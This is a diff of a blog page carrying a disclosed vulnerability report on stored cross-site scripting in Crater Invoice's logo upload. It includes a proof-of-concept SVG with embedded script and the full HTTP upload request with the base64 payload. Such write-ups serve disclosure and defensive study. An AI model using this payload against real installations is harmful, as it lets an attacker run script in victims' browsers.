@@ -12,7 +12,7 @@
     
     <meta name="description" content="Description There is a vulnerability in the upload avatar functionality of crater invoice which would allow an attacker to upload malicious .SVG files in order to execute Javascript. All that is required is that the victim browse to the link location of the .SVG file Proof of Concept
 Proof of Concept xss.svg:
-&lt;?xml version=&#34;1.0&#34; standalone=&#34;no&#34;?&gt; &lt;!DOCTYPE svg PUBLIC &#34;-//W3C//DTD SVG 1.1//EN&#34; &#34;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&#34;&gt; &lt;svg version=&#34;1.1&#34; baseProfile=&#34;full&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt; &lt;polygon id=&#34;triangle&#34; points=&#34;0,0 0,50 50,0&#34; fill=&#34;#009900&#34; stroke=&#34;#004400&#34;/&gt; &lt;script type=&#34;text/javascript&#34;&gt; alert(&#34;svg xss&#34;); &lt;/script&gt; &lt;/svg&gt; Request:">
+&lt;?xml version=&#34;1.0&#34; standalone=&#34;no&#34;?&gt; &lt;!DOCTYPE svg PUBLIC &#34;-//W3C//DTD SVG 1.1//EN&#34; &#34;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&#34;&gt; &lt;svg version=&#34;1.1&#34; baseProfile=&#34;full&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt; &lt;polygon id=&#34;triangle&#34; points=&#34;0,0 0,50 50,0&#34; fill=&#34;#009900&#34; stroke=&#34;#004400&#34;/&gt; &lt;script type=&#34;text/javascript&#34;&gt; alert(&#34;svg xss&#34;); &lt;/script&gt; &lt;/svg&gt;  Request:">
   
 
   <link rel="apple-touch-icon" sizes="180x180" href="https://1d8.github.io/apple-touch-icon.png">
@@ -54,6 +54,10 @@ Proof of Concept xss.svg:
   
   <link rel="stylesheet" type="text/css" href="/css/styles.css">
 
+  
+    <link rel="stylesheet" href="/css/custom_01.css">
+  
+    <link rel="stylesheet" href="/css/custom_02.css">
   
 
   
@@ -247,16 +251,17 @@ Proof of Concept xss.svg:
 Proof of Concept</p>
 <h1 id="proof-of-concept">Proof of Concept</h1>
 <p><strong>xss.svg:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; standalone=&#34;no&#34;?&gt;</span>
-<span style="color:#75715e">&lt;!DOCTYPE svg PUBLIC &#34;-//W3C//DTD SVG 1.1//EN&#34; &#34;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&#34;&gt;</span>
-<span style="color:#f92672">&lt;svg</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;1.1&#34;</span> <span style="color:#a6e22e">baseProfile=</span><span style="color:#e6db74">&#34;full&#34;</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://www.w3.org/2000/svg&#34;</span><span style="color:#f92672">&gt;</span>
-   <span style="color:#f92672">&lt;polygon</span> <span style="color:#a6e22e">id=</span><span style="color:#e6db74">&#34;triangle&#34;</span> <span style="color:#a6e22e">points=</span><span style="color:#e6db74">&#34;0,0 0,50 50,0&#34;</span> <span style="color:#a6e22e">fill=</span><span style="color:#e6db74">&#34;#009900&#34;</span> <span style="color:#a6e22e">stroke=</span><span style="color:#e6db74">&#34;#004400&#34;</span><span style="color:#f92672">/&gt;</span>
-   <span style="color:#f92672">&lt;script</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span><span style="color:#f92672">&gt;</span>
-      alert(&#34;svg xss&#34;);
-   <span style="color:#f92672">&lt;/script&gt;</span>
-<span style="color:#f92672">&lt;/svg&gt;</span>
-</code></pre></div><p><strong>Request:</strong></p>
-<pre tabindex="0"><code>POST /api/v1/company/upload-logo HTTP/1.1
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot;?&gt;
+&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;
+&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;
+   &lt;polygon id=&quot;triangle&quot; points=&quot;0,0 0,50 50,0&quot; fill=&quot;#009900&quot; stroke=&quot;#004400&quot;/&gt;
+   &lt;script type=&quot;text/javascript&quot;&gt;
+      alert(&quot;svg xss&quot;);
+   &lt;/script&gt;
+&lt;/svg&gt;
+</code></pre>
+<p><strong>Request:</strong></p>
+<pre><code>POST /api/v1/company/upload-logo HTTP/1.1
 Host: demo.craterapp.com
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
 Accept: */*
@@ -279,7 +284,8 @@ Content-Disposition: form-data; name=&quot;company_logo&quot;
 
 {&quot;name&quot;:&quot;xss.svg&quot;,&quot;data&quot;:&quot;data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBzdGFuZGFsb25lPSJubyI/Pgo8IURPQ1RZUEUgc3ZnIFBVQkxJQyAiLS8vVzNDLy9EVEQgU1ZHIDEuMS8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9HcmFwaGljcy9TVkcvMS4xL0RURC9zdmcxMS5kdGQiPgo8c3ZnIHZlcnNpb249IjEuMSIgYmFzZVByb2ZpbGU9ImZ1bGwiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CiAgIDxwb2x5Z29uIGlkPSJ0cmlhbmdsZSIgcG9pbnRzPSIwLDAgMCw1MCA1MCwwIiBmaWxsPSIjMDA5OTAwIiBzdHJva2U9IiMwMDQ0MDAiLz4KICAgPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgogICAgICBhbGVydCgic3ZnIHhzcyIpOwogICA8L3NjcmlwdD4KPC9zdmc+Cg==&quot;}
 -----------------------------202251926415456929271193356967--
-</code></pre><p><strong>Response:</strong></p>
+</code></pre>
+<p><strong>Response:</strong></p>
 <p><code>{&quot;success&quot;:true}</code></p>
 <h1 id="reference---httpshuntrdevbounties563232b9-5a93-4f4d-8389-ed805b262ef1">Reference - <a href="https://huntr.dev/bounties/563232b9-5a93-4f4d-8389-ed805b262ef1/">https://huntr.dev/bounties/563232b9-5a93-4f4d-8389-ed805b262ef1/</a></h1>
 
@@ -318,6 +324,10 @@ Content-Disposition: form-data; name=&quot;company_logo&quot;
 <link rel="stylesheet" href="/css/search.fe0cd54a21628574bff49d721c827d1bb165ab56b0f22dd55ae78addbe61c309.css"></link>
 
 
+
+  <script src="/js/custom_01.js"></script>
+
+  <script src="/js/custom_02.js"></script>
 
 
     
